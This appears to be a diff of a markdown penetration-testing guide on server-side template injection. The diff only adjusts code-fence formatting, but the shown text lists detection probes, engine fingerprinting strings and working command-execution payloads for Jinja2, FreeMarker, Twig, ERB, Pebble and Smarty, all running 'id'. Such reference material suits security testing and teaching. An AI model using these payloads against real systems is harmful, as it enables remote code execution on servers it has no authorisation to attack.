@@ -36,7 +36,7 @@ done
 
 Inject into every user-controlled parameter:
 
-```
+```text
 {{7*7}}           → 49 (Jinja2, Twig)
 ${7*7}            → 49 (FreeMarker, Velocity, EL)
 <%= 7*7 %>        → 49 (ERB, JSP)
@@ -49,7 +49,7 @@ ${{<%[%'"}}%\.    → polyglot; renders or errors on any engine in the set
 
 ### Phase 3: Engine Fingerprinting
 
-```
+```text
 {{config.items()}}                    → Jinja2 (Flask/Python)
 {{request.application.__globals__}}   → Jinja2
 ${T(java.lang.Runtime)}               → Spring EL
@@ -61,44 +61,52 @@ ${T(java.lang.Runtime)}               → Spring EL
 ### Phase 4: Exploitation
 
 **Jinja2 (Python/Flask):**
-```
+
+```text
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}
 ```
 
 **FreeMarker (Java):**
-```
+
+```text
 ${"freemarker.template.utility.Execute"?new()("id")}
 ```
 
 **Twig (PHP):**
-```
+
+```text
 {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
 ```
 
 **ERB (Ruby):**
-```
+
+```text
 <%= `id` %>
 <%= system('id') %>
 ```
 
 **FreeMarker (Java) — assign variant:**
-```
+
+```text
 <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
 ```
 
 **Pebble (Java):**
-```
+
+```text
 {% set cmd='id' %}{% set bytes=cmd.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) %}
 ```
 
 **Smarty (PHP):**
-```
+
+```text
 {system('id')}
 ```
 
 **Handlebars (JS):** detection `{{this}}`; escalate through the block helper —
-```
+
+```text
 {{#with "s" as |string|}}...{{/with}}
 ```
 
